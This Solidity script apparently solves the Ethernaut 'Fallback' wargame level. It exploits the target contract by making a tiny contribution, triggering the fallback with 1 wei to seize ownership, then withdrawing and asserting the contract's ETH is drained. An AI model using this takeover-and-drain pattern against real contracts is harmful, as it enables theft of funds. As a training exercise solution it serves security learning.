// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./EthernautSolution.s.sol";

interface IFallback {
    function contribute() external payable;
    function withdraw() external;
    function owner() external view returns (address);
    function contributions(address) external view returns (uint256);
}

contract FallbackScript is EthernautSolution {
    function run() external {
        address instance = vm.envOr("INSTANCE", address(0xF9Ab3e7a31522168101f85B377c72140457F1FBA));
        IFallback target = IFallback(instance);
        (uint256 pk, address player, bool isLocal) = getPlayer();

        startSession(pk, player, isLocal);

        target.contribute{value: 1 wei}();
        (bool success,) = instance.call{value: 1 wei}("");
        require(success, "Call failed");
        target.withdraw();
        require(target.owner() == player, "Failed: not the owner");
        require(address(instance).balance == 0, "Failed: ETH not drained");

        stopSession(isLocal);
    }
}
